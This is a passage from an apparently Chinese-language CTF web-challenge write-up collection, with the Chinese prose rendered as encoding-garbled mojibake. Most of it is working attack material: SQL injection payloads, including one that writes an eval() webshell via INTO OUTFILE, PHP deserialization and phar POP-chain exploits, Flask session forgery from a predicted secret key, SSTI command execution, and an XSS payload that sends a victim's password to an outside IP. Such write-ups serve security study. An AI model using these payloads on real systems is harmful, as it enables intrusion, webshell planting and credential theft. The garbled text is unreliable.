$updateAction=new UpdateHelper($_SESSION[\u0026#39;id\u0026#39;],$Info,\u0026#34;update user SET age=$age,nickname=$nickname where id=\u0026#34;.$_SESSION[\u0026#39;id\u0026#39;]); //è¿™ä¸ªåŠŸèƒ½è¿˜æ²¡æœ‰å†™å®Œ å…ˆå å‘ } public function getNewInfo(){ $age=$_POST[\u0026#39;age\u0026#39;]; $nickname=$_POST[\u0026#39;nickname\u0026#39;]; return safe(serialize(new Info($age,$nickname))); } update.phpé‡Œé¢postä¼ ageå’Œnickname\n1 age=1\u0026amp;nickname=unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion\u0026#34;;s:8:\u0026#34;CtrlCase\u0026#34;;O:12:\u0026#34;UpdateHelper\u0026#34;:1:{s:3:\u0026#34;sql\u0026#34;;O:4:\u0026#34;User\u0026#34;:2:{s:3:\u0026#34;age\u0026#34;;s:70:\u0026#34;select 1,\u0026#34;c4ca4238a0b923820dcc509a6f75849b\u0026#34; from user where username=?\u0026#34;;s:8:\u0026#34;nickname\u0026#34;;O:4:\u0026#34;Info\u0026#34;:1:{s:8:\u0026#34;CtrlCase\u0026#34;;O:6:\u0026#34;dbCtrl\u0026#34;:2:{s:4:\u0026#34;name\u0026#34;;s:5:\u0026#34;admin\u0026#34;;s:8:\u0026#34;password\u0026#34;;s:1:\u0026#34;1\u0026#34;;}}}}} ç„¶åç”¨adminç™»å…¥\n[SUCTF 2018]MultiSQL è¿™é‡Œåˆ©ç”¨sqlçš„é¢„å¤„ç†è¯­å¥\nset çš„ä½œç”¨å°±æ˜¯å®šä¹‰ä¸€ä¸ªå˜é‡ï¼Œå˜é‡çš„å‘½åå¿…é¡»æ˜¯@å¼€å¤´ã€‚\nprepareå’Œexecute prepareè¯­å¥ç”¨äºé¢„å®šä¹‰ä¸€ä¸ªè¯­å¥ï¼Œå¹¶å¯ä»¥æŒ‡å®šé¢„å®šä¹‰è¯­å¥åç§°ã€‚executeåˆ™æ˜¯æ‰§è¡Œé¢„å®šä¹‰è¯­å¥ã€‚\n1 select â€˜\u0026lt;?php eval($_POST[_]);?\u0026gt;â€™ into outfile â€˜/var/www/html/favicon/shell.phpâ€™; åˆ©ç”¨charç»•è¿‡waf\nå…ˆè½¬è¿›åˆ¶\n1 2 3 4 5 6 7 8 str=\u0026#34;select \u0026#39;\u0026lt;?php eval($_POST[_]);?\u0026gt;\u0026#39; into outfile \u0026#39;/var/www/html/favicon/shell.php\u0026#39;;\u0026#34; len_str=len(str) for i in range(0,len_str): if i == 0: print(\u0026#39;char(%s\u0026#39;%ord(str[i]),end=\u0026#34;\u0026#34;) else: print(\u0026#39;,%s\u0026#39;%ord(str[i]),end=\u0026#34;\u0026#34;) print(\u0026#39;)\u0026#39;) 1 char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,95,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59) payload\n1 ?id=2;set @sql=char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,95,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59);prepare query from @sql;execute query; ç„¶åè®¿é—®/favicon/shell.php\n[SUCTF 2018]annonymous 1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;?php $MY = create_function(\u0026#34;\u0026#34;,\u0026#34;die(`cat flag.php`);\u0026#34;); $hash = bin2hex(openssl_random_pseudo_bytes(32)); eval(\u0026#34;function SUCTF_$hash(){\u0026#34; .\u0026#34;global \\$MY;\u0026#34; .\u0026#34;\\$MY();\u0026#34; .\u0026#34;}\u0026#34;); if(isset($_GET[\u0026#39;func_name\u0026#39;])){ $_GET[\u0026#34;func_name\u0026#34;](); die(); } show_source(__FILE__); hashéšæœºç”Ÿæˆæ•°å­—æ‹¼æ¥åˆ°ä¸‹é¢å‡½æ•°ä¸­ï¼Œè¿™ä¸ªéšæœºæ²¡åŠæ³•ï¼Œä½†æ˜¯create_functionå‡½æ•°æœ‰ä¸ªæ¼æ´ï¼Œä¸Šæ¬¡æ[HITCON 2017]Baby^h Master PHPçš„æ—¶å€™é‡åˆ°äº†\nä¼šç”ŸæˆåŒ¿åå‡½æ•°\\0lambda_%d\né€šè¿‡å¤§é‡çš„è¯·æ±‚æ¥è¿«ä½¿Pre-forkæ¨¡å¼å¯åŠ¨\n1 2 3 4 5 6 7 import requests while True: r=requests.get(\u0026#39;http://a10002f2-2091-47dc-9b7c-996d05cd4faa.node3.buuoj.cn/?func_name=%00lambda_1\u0026#39;) if \u0026#39;flag\u0026#39; in r.text: print(r.text) break print(\u0026#39;[-]\u0026#39;) [RootersCTF2019]babyWeb æŠ¥é”™æ³¨å…¥ï¼Œè¿‡æ»¤orç”¨||ç»•è¿‡\nè¿‡æ»¤å•åŒå¼•å·ç”¨16è¿›åˆ¶ç»•è¿‡\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 search=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1)%23 //sql_injection search=1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=0x73716C5F696E6A656374696F6E),0x7e),1)%23 //users search=1 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),0x7e),1)%23 search=1 and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=0x7573657273 limit 4,1),0x7e),1)%23 //USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,user,uniqueid search=1 and updatexml(1,concat(0x7e,(select count(uniqueid) from users),0x7e),1)%23 //2 search=1 and updatexml(1,concat(0x7e,(select group_concat(uniqueid) from users),0x7e),1)%23 //837461526918364526,123456789928466788 æˆ–è€…ç”¨ä¸‡èƒ½å¯†ç \n1 1 || 1=1 limit 0,1 [å®‰æ´µæ¯ 2019]ä¸æ˜¯æ–‡ä»¶ä¸Šä¼  å…ˆç”¨æºç çš„ååºåˆ—åŒ–\n1 2 3 4 5 6 7 8 \u0026lt;?php class helper { protected $ifview = True; protected $config = \u0026#34;/flag\u0026#34;; } $a = new helper(); echo serialize($a); ?\u0026gt; 1 O:6:\u0026#34;helper\u0026#34;:2:{s:9:\u0026#34;*ifview\u0026#34;;b:1;s:9:\u0026#34;*config\u0026#34;;s:5:\u0026#34;/flag\u0026#34;;} å› ä¸ºéƒ½æ˜¯protectedå±æ€§çš„ï¼Œç”¨\\0\\0\\0æ›¿æ¢ï¼ˆæºç ç»™çš„\n1 2 3 foreach($data as $key=\u0026gt;$value){ $key_temp = str_replace(chr(0).\u0026#39;*\u0026#39;.chr(0), \u0026#39;\\0\\0\\0\u0026#39;, $key); $value_temp = str_replace(chr(0).\u0026#39;*\u0026#39;.chr(0), \u0026#39;\\0\\0\\0\u0026#39;, $value); 1 O:6:\u0026#34;helper\u0026#34;:2:{s:9:\u0026#34;\\0\\0\\0ifview\u0026#34;;b:1;s:9:\u0026#34;\\0\\0\\0config\u0026#34;;s:5:\u0026#34;/flag\u0026#34;;} ç„¶åæºç æœ‰è¿™ä¸€è¡Œ\n1 $sql = \u0026#34;INSERT INTO images (\u0026#34;.(implode(\u0026#34;,\u0026#34;,$sql_fields)).\u0026#34;) VALUES(\u0026#34;.(implode(\u0026#34;,\u0026#34;,$sql_val)).\u0026#34;)\u0026#34;; çœ‹è¿”å›å€¼titileå¯æ§\næ‹¼æ¥ç„¶å16è¿›åˆ¶ç»•è¿‡åŒå¼•å·waf\n1 1\u0026#39;,\u0026#39;1\u0026#39;,\u0026#39;1\u0026#39;,\u0026#39;1\u0026#39;,0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d),(\u0026#39;1.jpg ç„¶åä¿®æ”¹æ–‡ä»¶å\nè®¿é—®show.phpè§¦å‘ååºåˆ—åŒ–\n[å¼ºç½‘æ¯ 2019]Upload ç›®å½•æ‰«æwww.tar.gz\nthinkphp5\nprofile.phpä¸‹é¢æœ‰ä¸¤ä¸ªé­”æœ¯æ–¹æ³•\n1 2 3 4 5 6 7 8 9 10 11 public function __get($name) { return $this-\u0026gt;except[$name]; } public function __call($name, $arguments) { if($this-\u0026gt;{$name}){ $this-\u0026gt;{$this-\u0026gt;{$name}}($arguments); } } register.phpé‡Œé¢ä¹Ÿæœ‰\n1 2 3 4 5 6 public function __destruct() { if(!$this-\u0026gt;registed){ $this-\u0026gt;checker-\u0026gt;index(); } } 1 Profileèµ‹å€¼checkerï¼Œè§¦å‘callï¼Œç„¶åagrumentä¸ºç©º,è§¦å‘getï¼Œç„¶åexceptå¯æ§ ç„¶åå›æ¥çœ‹ä¸Šä¼ çš„é€»è¾‘\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 if(!empty($_FILES)){ $this-\u0026gt;filename_tmp=$_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $this-\u0026gt;filename=md5($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;]).\u0026#34;.png\u0026#34;; $this-\u0026gt;ext_check(); } if($this-\u0026gt;ext) { if(getimagesize($this-\u0026gt;filename_tmp)) { @copy($this-\u0026gt;filename_tmp, $this-\u0026gt;filename); @unlink($this-\u0026gt;filename_tmp); $this-\u0026gt;img=\u0026#34;../upload/$this-\u0026gt;upload_menu/$this-\u0026gt;filename\u0026#34;; $this-\u0026gt;update_img(); } public function update_img(){ $user_info=db(\u0026#39;user\u0026#39;)-\u0026gt;where(\u0026#34;ID\u0026#34;,$this-\u0026gt;checker-\u0026gt;profile[\u0026#39;ID\u0026#39;])-\u0026gt;find(); if(empty($user_info[\u0026#39;img\u0026#39;]) \u0026amp;\u0026amp; $this-\u0026gt;img){ if(db(\u0026#39;user\u0026#39;)-\u0026gt;where(\u0026#39;ID\u0026#39;,$user_info[\u0026#39;ID\u0026#39;])-\u0026gt;data([\u0026#34;img\u0026#34;=\u0026gt;addslashes($this-\u0026gt;img)])-\u0026gt;update()){ $this-\u0026gt;update_cookie(); $this-\u0026gt;success(\u0026#39;Upload img successful!\u0026#39;, url(\u0026#39;../home\u0026#39;)); }else{ $this-\u0026gt;error(\u0026#39;Upload file failed!\u0026#39;, url(\u0026#39;../index\u0026#39;)); } } } ç¬¬ä¸€æ¬¡ä¸Šä¼ å°±èƒ½ä½¿empty=1ï¼Œç»•è¿‡.pngçš„æ‹¼æ¥\nè¦ä½¿ext=1\nindex.phpé‡Œé¢ä¼šååºåˆ—åŒ–cookie\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php namespace app\\web\\controller; class Register{ public $checker; public $registed =0;//ç›®çš„æ˜¯è¿‡destructé‡Œçš„if; } class Profile{ public $checker =0 ;//ç›®çš„æ˜¯ç»•è¿‡indexç±»çš„æ£€æŸ¥ï¼Œé˜²æ­¢é€€å‡ºç¨‹åº public $filename_tmp=\u0026#34;./upload/9987df285bb375eda68448315c5656e5/4a47a0db6e60853dedfcfdf08a5ca249.png\u0026#34;; public $upload_menu; public $filename=\u0026#34;upload/shell.php\u0026#34;; public $ext=1;//ç›®çš„æ˜¯è¿‡ifæ¥è°ƒç”¨å¤åˆ¶webshell public $img; public $except=array(\u0026#34;index\u0026#34;=\u0026gt;\u0026#34;upload_img\u0026#34;);//ç›®çš„æ˜¯é€šè¿‡__get()é­”æœ¯æ–¹æ³•è°ƒç”¨upload_Imgå‡½æ•° } $a = new Register(); $a-\u0026gt;checker = new Profile();//ç›®çš„æ˜¯è°ƒç”¨POPé“¾ $a-\u0026gt;checker-\u0026gt;checker=0ï¼›//è°ƒç”¨popé“¾é˜²æ­¢é€€å‡ºç¨‹åº echo base64_encode(serialize($a)); cookieæ›¿æ¢å®Œè®¿é—®/upload/shell.php\n[CISCN2019 åä¸œå—èµ›åŒº]Web4 fileåè®®è¯»ä¸å‡ºæ¥ï¼ŒçŒœæµ‹pythonå†™çš„ç•Œé¢\nåˆ©ç”¨local_file://åè®®è¯»æ–‡ä»¶ï¼Œæˆ–è€…ä»€ä¹ˆéƒ½ä¸ç”¨ç›´æ¥è¯»æ–‡ä»¶\n1 /read?url=local_file:///etc/passwd è¯»app.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 import re, random, uuid, urllib from flask import Flask, session, request app = Flask(__name__) random.seed(uuid.getnode()) app.config[\u0026#39;SECRET_KEY\u0026#39;] = str(random.random()*233) app.debug = True @app.route(\u0026#39;/\u0026#39;) def index(): session[\u0026#39;username\u0026#39;] = \u0026#39;www-data\u0026#39; return \u0026#39;Hello World! \u0026lt;a href=\u0026#34;/read?url=https://baidu.com\u0026#34;\u0026gt;Read somethings\u0026lt;/a\u0026gt;\u0026#39; @app.route(\u0026#39;/read\u0026#39;) def read(): try: url = request.args.get(\u0026#39;url\u0026#39;) m = re.findall(\u0026#39;^file.*\u0026#39;, url, re.IGNORECASE) n = re.findall(\u0026#39;flag\u0026#39;, url, re.IGNORECASE) if m or n: return \u0026#39;No Hack\u0026#39; res = urllib.urlopen(url) return res.read() except Exception as ex: print str(ex) return \u0026#39;no response\u0026#39; @app.route(\u0026#39;/flag\u0026#39;) def flag(): if session and session[\u0026#39;username\u0026#39;] == \u0026#39;fuck\u0026#39;: return open(\u0026#39;/flag.txt\u0026#39;).read() else: return \u0026#39;Access denied\u0026#39; if __name__==\u0026#39;__main__\u0026#39;: app.run( debug=True, host=\u0026#34;0.0.0.0\u0026#34; ) å¯ä»¥çœ‹åˆ°è¦è®¿é—®flagè·¯ç”±ï¼Œè€Œä¸”sessioné‡Œé¢çš„usernameè¦ä¸ºfuck\nusernameé‚£ä¸ªå­—æ®µæ˜¯base64ç¼–ç åçš„www-data\nè¦çŸ¥é“secret-keyå°±èƒ½ä¼ªé€ äº†\nä¼ªé€ sessioné¦–å…ˆè¦æ‹¿åˆ°secret_keyï¼Œçœ‹ä¸€ä¸‹secret_keyçš„ç”Ÿæˆæ–¹å¼\n1 2 random.seed(uuid.getnode()) //ç§å­æ˜¯uuid.getnode(),å³æœºå™¨çš„å›ºå®šæ ‡è¯†ç¬¦ï¼Œæ ¹æ®macåœ°å€è½¬åŒ–ä¸ºåè¿›åˆ¶æ•° app.config[\u0026#39;SECRET_KEY\u0026#39;] = str(random.random()*233) //è¿™é‡Œæœ‰äº†ç§å­å°±å¯ä»¥è‡ªå·±ç”Ÿæˆsecret_key è¯»å–/sys/class/net/eth0/addressè·å–macåœ°å€\n4e:46:44:62:43:f0\n1 2 3 4 import random random.seed(0x4e46446243f0) print(str(random.random()*233)) //12.498945071696037 ç„¶åflask-sessionä¼ªé€ \nè¿™é‡Œæ˜¯py2ç¯å¢ƒ\n1 python flask_session_cookie_manager2.py encode -s 12.498945071696037 -t \u0026#34;{\u0026#39;username\u0026#39;:b\u0026#39;fuck\u0026#39;}\u0026#34; [GXYCTF2019]BabysqliV3.0 å¼±å£ä»¤admin/password\nè¿›å»ä¼ªåè®®è¯»æºç \nupload.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 \u0026lt;?php error_reporting(0); class Uploader{ public $Filename; public $cmd; public $token; function __construct(){ $sandbox = getcwd().\u0026#34;/uploads/\u0026#34;.md5($_SESSION[\u0026#39;user\u0026#39;]).\u0026#34;/\u0026#34;; $ext = \u0026#34;.txt\u0026#34;; @mkdir($sandbox, 0777, true); if(isset($_GET[\u0026#39;name\u0026#39;]) and !preg_match(\u0026#34;/data:\\/\\/ | filter:\\/\\/ | php:\\/\\/ | \\./i\u0026#34;, $_GET[\u0026#39;name\u0026#39;])){ $this-\u0026gt;Filename = $_GET[\u0026#39;name\u0026#39;]; } else{ $this-\u0026gt;Filename = $sandbox.$_SESSION[\u0026#39;user\u0026#39;].$ext; } $this-\u0026gt;cmd = \u0026#34;echo \u0026#39;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;Master, I want to study rizhan!\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026#39;;\u0026#34;; $this-\u0026gt;token = $_SESSION[\u0026#39;user\u0026#39;]; } function upload($file){ global $sandbox; global $ext; if(preg_match(\u0026#34;[^a-z0-9]\u0026#34;, $this-\u0026gt;Filename)){ $this-\u0026gt;cmd = \u0026#34;die(\u0026#39;illegal filename!\u0026#39;);\u0026#34;; } else{ if($file[\u0026#39;size\u0026#39;] \u0026gt; 1024){ $this-\u0026gt;cmd = \u0026#34;die(\u0026#39;you are too big (â€²â–½`ã€ƒ)\u0026#39;);\u0026#34;; } else{ $this-\u0026gt;cmd = \u0026#34;move_uploaded_file(\u0026#39;\u0026#34;.$file[\u0026#39;tmp_name\u0026#39;].\u0026#34;\u0026#39;, \u0026#39;\u0026#34; . $this-\u0026gt;Filename . \u0026#34;\u0026#39;);\u0026#34;; } } } function __toString(){ global $sandbox; global $ext; // return $sandbox.$this-\u0026gt;Filename.$ext; return $this-\u0026gt;Filename; } function __destruct(){ if($this-\u0026gt;token != $_SESSION[\u0026#39;user\u0026#39;]){ $this-\u0026gt;cmd = \u0026#34;die(\u0026#39;check token falied!\u0026#39;);\u0026#34;; } eval($this-\u0026gt;cmd); } } if(isset($_FILES[\u0026#39;file\u0026#39;])) { $uploader = new Uploader(); $uploader-\u0026gt;upload($_FILES[\u0026#34;file\u0026#34;]); if(@file_get_contents($uploader)){ echo \u0026#34;ä¸‹é¢æ˜¯ä½ ä¸Šä¼ çš„æ–‡ä»¶ï¼š\u0026lt;br\u0026gt;\u0026#34;.$uploader.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo file_get_contents($uploader); } } ?\u0026gt; pharååºåˆ—åŒ–\néé¢„æœŸï¼Œfilenameå¯æ§ï¼Œç›´æ¥ä¼ å‚\n1 /home.php?file=upload\u0026amp;name=/var/www/html/flag.php å¾—åˆ°flag\nåŸæ¥è¿˜æœ‰ä¸€ä¸ªç›´æ¥ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬çš„éé¢„æœŸä¼°è®¡ç»™ä¿®äº†\n1 2 3 4 if($this-\u0026gt;token != $_SESSION[\u0026#39;user\u0026#39;]){ $this-\u0026gt;cmd = \u0026#34;die(\u0026#39;check token falied!\u0026#39;);\u0026#34;; } eval($this-\u0026gt;cmd); tokenå¯ä»¥é€šè¿‡éšä¾¿ä¸Šä¼ æ–‡ä»¶æ¥è·å–\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;?php class Uploader{ public $Filename; public $cmd; public $token; } $upload = new Uploader(); $upload-\u0026gt;cmd = \u0026#34;highlight_file(\u0026#39;/var/www/html/flag.php\u0026#39;);\u0026#34;; $upload-\u0026gt;Filename = \u0026#39;test\u0026#39;; $upload-\u0026gt;token = \u0026#39;GXY063c630ae7ab41c6fd121cb4851620a3\u0026#39;; $phar = new Phar(\u0026#34;exp.phar\u0026#34;); $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setStub(\u0026#39;GIF89a\u0026#39;.\u0026#39;\u0026lt;?php __HALT_COMPILER(); ? \u0026gt;\u0026#39;); $phar-\u0026gt;setMetadata($upload); $phar-\u0026gt;addFromString(\u0026#34;exp.txt\u0026#34;, \u0026#34;test\u0026#34;); $phar-\u0026gt;stopBuffering(); [pasecactf_2019]flask_ssti ç®€å•çš„ssti\nè¿‡æ»¤ä¸‹åˆ’çº¿å’Œå•å¼•å·ï¼Œ16è¿›åˆ¶ç»•è¿‡\n1 {{config[\u0026#34;\\x5f\\x5fclass\\x5f\\x5f\u0026#34;][\u0026#34;\\x5f\\x5finit\\x5f\\x5f\u0026#34;][\u0026#34;\\x5f\\x5fglobals\\x5f\\x5f\u0026#34;][\u0026#34;os\u0026#34;][\u0026#34;popen\u0026#34;](\u0026#34;whoami\u0026#34;)[\u0026#34;read\u0026#34;]()}} flagä¸åœ¨ç›®å½•\nè¯»configçœ‹åˆ°åŠ å¯†åçš„\n1 2 3 4 def encode(line, key, key2): return \u0026#39;\u0026#39;.join(chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x])) for x in range(len(line))) app.config[\u0026#39;flag\u0026#39;] = encode(\u0026#39;\u0026#39;, \u0026#39;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W34\u0026#39;, \u0026#39;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT5\u0026#39;) ç”±äºæ˜¯å¼‚æˆ–å†è¿è¡Œä¸€éå°±è¡Œäº†\næˆ–è€…è¯»proc/self/fd/3\nå› ä¸ºfdç›®å½•å¯ä»¥è¯»åˆ°è¢«åˆ çš„çš„æ–‡ä»¶å†…å®¹\nä½†æ˜¯ä¸Šé¢ç›´æ¥è¯»æ˜¯æ²¡æœ‰çš„\nå› ä¸ºselfæŒ‡å‘å‰é¢çš„popenï¼Œpopenè·Ÿflagæ“ä½œæ— å…³\næˆ‘ä»¬å…ˆè¯»psè¿›ç¨‹ï¼Œè¯»åˆ°pidä¸º1\n1 cat /proc/1/fd/3 [EIS 2019]EzPOP æ„é€ popé“¾\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 \u0026lt;?php class A { protected $store; protected $key; protected $expire; public function __construct($store,$key,$expire) { $this-\u0026gt;key=$key; $this-\u0026gt;expire=$expire; $this-\u0026gt;store=$store; } } class B{ public $option; } $b=new B(); $b-\u0026gt;options[\u0026#39;serialize\u0026#39;]=\u0026#39;base64_decode\u0026#39;; $b-\u0026gt;options[\u0026#39;data_compress\u0026#39;]=false; $b-\u0026gt;options[\u0026#39;prefix\u0026#39;]=\u0026#39;php://filter/write=string.strip_tags|convert.base64-decode/resource=uploads/\u0026#39;; $a=new A($b,\u0026#39;shell.php\u0026#39;,0); $a-\u0026gt;autosave=false; $a-\u0026gt;cache=array(); $a-\u0026gt;complete=base64_encode(base64_encode(\u0026#39;\u0026lt;?php @eval($_POST[\u0026#34;cmd\u0026#34;]); ?\u0026gt;\u0026#39;)); echo urlencode(serialize($a)); ?\u0026gt; [GWCTF 2019]mypassword æ³¨å†Œç™»å…¥åæŸ¥çœ‹feedback.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 if(is_array($feedback)){ echo \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;åé¦ˆä¸åˆæ³•\u0026#39;);\u0026lt;/script\u0026gt;\u0026#34;; return false; } $blacklist = [\u0026#39;_\u0026#39;,\u0026#39;\\\u0026#39;\u0026#39;,\u0026#39;\u0026amp;\u0026#39;,\u0026#39;\\\\\u0026#39;,\u0026#39;#\u0026#39;,\u0026#39;%\u0026#39;,\u0026#39;input\u0026#39;,\u0026#39;script\u0026#39;,\u0026#39;iframe\u0026#39;,\u0026#39;host\u0026#39;,\u0026#39;onload\u0026#39;,\u0026#39;onerror\u0026#39;,\u0026#39;srcdoc\u0026#39;,\u0026#39;location\u0026#39;,\u0026#39;svg\u0026#39;,\u0026#39;form\u0026#39;,\u0026#39;img\u0026#39;,\u0026#39;src\u0026#39;,\u0026#39;getElement\u0026#39;,\u0026#39;document\u0026#39;,\u0026#39;cookie\u0026#39;]; foreach ($blacklist as $val) { while(true){ if(stripos($feedback,$val) !== false){ $feedback = str_ireplace($val,\u0026#34;\u0026#34;,$feedback); }else{ break; } } } é»‘åå•ä¸€çœ‹å°±æ˜¯xss\nç”±äºå‰é¢login.js\n1 2 3 4 5 6 7 8 9 10 11 12 13 if (document.cookie \u0026amp;\u0026amp; document.cookie != \u0026#39;\u0026#39;) { var cookies = document.cookie.split(\u0026#39;; \u0026#39;); var cookie = {}; for (var i = 0; i \u0026lt; cookies.length; i++) { var arr = cookies[i].split(\u0026#39;=\u0026#39;); var key = arr[0]; cookie[key] = arr[1]; } if(typeof(cookie[\u0026#39;user\u0026#39;]) != \u0026#34;undefined\u0026#34; \u0026amp;\u0026amp; typeof(cookie[\u0026#39;psw\u0026#39;]) != \u0026#34;undefined\u0026#34;){ document.getElementsByName(\u0026#34;username\u0026#34;)[0].value = cookie[\u0026#39;user\u0026#39;]; document.getElementsByName(\u0026#34;password\u0026#34;)[0].value = cookie[\u0026#39;psw\u0026#39;]; } } è®°ä½å¯†ç åŠŸèƒ½ä¼šå°†è¯»å–cookieä¸­çš„password\näºæ˜¯æ„é€ ä¸€ä¸ªç™»å½•æ¡†å¹¶ä¸”å¼•å…¥login.jsæäº¤åé¦ˆç­‰å¾…botç‚¹å¼€è·å¾—flag\n1 2 3 4 5 6 7 \u0026lt;incookieput type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34;\u0026gt; \u0026lt;incookieput type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34;\u0026gt; \u0026lt;scrcookieipt scookierc=\u0026#34;./js/login.js\u0026#34;\u0026gt;\u0026lt;/scrcookieipt\u0026gt; \u0026lt;scrcookieipt\u0026gt; var psw = docucookiement.getcookieElementsByName(\u0026#34;password\u0026#34;)[0].value; docucookiement.locacookietion=\u0026#34;http://47.122.53.248:2333/?psw=\u0026#34;+psw; \u0026lt;/scrcookieipt\u0026gt; [HFCTF2020]BabyUpload æºç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 \u0026lt;?php error_reporting(0); session_save_path(\u0026#34;/var/babyctf/\u0026#34;); session_start(); require_once \u0026#34;/flag\u0026#34;; highlight_file(__FILE__); if($_SESSION[\u0026#39;username\u0026#39;] ===\u0026#39;admin\u0026#39;) { $filename=\u0026#39;/var/babyctf/success.txt\u0026#39;; if(file_exists($filename)){ safe_delete($filename); die($flag); } } else{ $_SESSION[\u0026#39;username\u0026#39;] =\u0026#39;guest\u0026#39;; } $direction = filter_input(INPUT_POST, \u0026#39;direction\u0026#39;); $attr = filter_input(INPUT_POST, \u0026#39;attr\u0026#39;); $dir_path = \u0026#34;/var/babyctf/\u0026#34;.$attr; if($attr===\u0026#34;private\u0026#34;){ $dir_path .= \u0026#34;/\u0026#34;.$_SESSION[\u0026#39;username\u0026#39;]; } if($direction === \u0026#34;upload\u0026#34;){ try{ if(!is_uploaded_file($_FILES[\u0026#39;up_file\u0026#39;][\u0026#39;tmp_name\u0026#39;])){ throw new RuntimeException(\u0026#39;invalid upload\u0026#39;); } $file_path = $dir_path.\u0026#34;/\u0026#34;.$_FILES[\u0026#39;up_file\u0026#39;][\u0026#39;name\u0026#39;]; $file_path .= \u0026#34;_\u0026#34;.hash_file(\u0026#34;sha256\u0026#34;,$_FILES[\u0026#39;up_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]); if(preg_match(\u0026#39;/(\\.\\.\\/|\\.\\.\\\\\\\\)/\u0026#39;, $file_path)){ throw new RuntimeException(\u0026#39;invalid file path\u0026#39;); } @mkdir($dir_path, 0700, TRUE); if(move_uploaded_file($_FILES[\u0026#39;up_file\u0026#39;][\u0026#39;tmp_name\u0026#39;],$file_path)){ $upload_result = \u0026#34;uploaded\u0026#34;; }else{ throw new RuntimeException(\u0026#39;error while saving\u0026#39;); } } catch (RuntimeException $e) { $upload_result = $e-\u0026gt;getMessage(); } } elseif ($direction === \u0026#34;download\u0026#34;) { try{ $filename = basename(filter_input(INPUT_POST, \u0026#39;filename\u0026#39;)); $file_path = $dir_path.\u0026#34;/\u0026#34;.$filename; if(preg_match(\u0026#39;/(\\.\\.\\/|\\.\\.\\\\\\\\)/\u0026#39;, $file_path)){ throw new RuntimeException(\u0026#39;invalid file path\u0026#39;); } if(!file_exists($file_path)) { throw new RuntimeException(\u0026#39;file not exist\u0026#39;); } header(\u0026#39;Content-Type: application/force-download\u0026#39;); header(\u0026#39;Content-Length: \u0026#39;.filesize($file_path)); header(\u0026#39;Content-Disposition: attachment; filename=\u0026#34;\u0026#39;.substr($filename, 0, -65).\u0026#39;\u0026#34;\u0026#39;); if(readfile($file_path)){ $download_result = \u0026#34;downloaded\u0026#34;; }else{ throw new RuntimeException(\u0026#39;error while saving\u0026#39;); } } catch 